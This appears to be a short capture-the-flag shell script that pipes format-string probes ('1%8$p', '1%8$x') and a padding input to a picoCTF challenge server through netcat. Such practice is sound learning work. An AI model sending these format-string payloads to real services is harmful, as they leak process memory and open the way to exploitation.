#/bin/sh

nc mercury.picoctf.net 33411 < inputs.txt
echo "1%8$p" | nc mercury.picoctf.net 33411
echo "1%8$x" | nc mercury.picoctf.net 33411
echo "1%128s" | nc mercury.picoctf.net 33411
